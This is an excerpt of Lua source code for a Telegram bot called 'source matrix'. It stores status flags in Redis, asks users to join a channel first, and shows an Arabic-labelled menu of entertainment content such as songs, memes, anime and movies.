Redis:set(Dev:MaTriX.."Matrix:Status:distraction3"..msg_chat_id,true) 
Redis:set(Dev:MaTriX.."Matrix:Status:distraction2"..msg_chat_id,true) 
Redis:set(Dev:MaTriX.."Matrix:Status:distraction1"..msg_chat_id,true) 
...
local Get_Chat = LuaTele.getChat(Redis:get(Dev:MaTriX..'Matrix:ChanneliD:Join'))
local NcH = (Redis:get(Dev:MaTriX.."Matrix:CH:Bot") or Get_Chat.title)
local NcHlink = (Redis:get(Dev:MaTriX.."Matrix:CHlink:Bot") or "≭︰عذراً لاتستطيع استخدام البوت !\n≭︰عليك الاشتراك في القناة اولاً :")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = NcH, url = 't.me/'..Redis:get(Dev:MaTriX..'Matrix:Channel:Join')},},}}
return LuaTele.sendText(msg.chat_id,msg.id,NcHlink,"md",false, false, false, false, reply_markup) end
local R = Redis:scard(Dev:MaTriX.."Matrix:List:Rd:Sudo")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '‹ غنيلي ›', data = msg.sender_id.user_id..'/Song'},},{{text = '‹ شعر ›', data = msg.sender_id.user_id..'/voice'},{text = '‹ اغنيه ›', data = msg.sender_id.user_id..'/Mp'},},{{text = '‹ ميمز ›', data = msg.sender_id.user_id..'/Memz'},{text = '‹ ريمكس ›', data = msg.sender_id.user_id..'/Remix'},},{{text = '‹ انمي ›', data = msg.sender_id.user_id..'/Anime'},{text = '‹ صوره ›', data = msg.sender_id.user_id..'/Photos'},},{{text = '‹ مسلسل ›', data = msg.sender_id.user_id..'/Series'},{text = '‹ فلم ›', data = msg.sender_id.user_id..'/Movies'},},{{text = '‹ متحركه ›', data = msg.sender_id.user_id..'/animation'},},{{text = '‹ source matrix ›', url = 't.me/source_matrixr'},},}}
...
end -- end new msg dev.mr MaTriX 
end -- end callback dev.mr MaTriX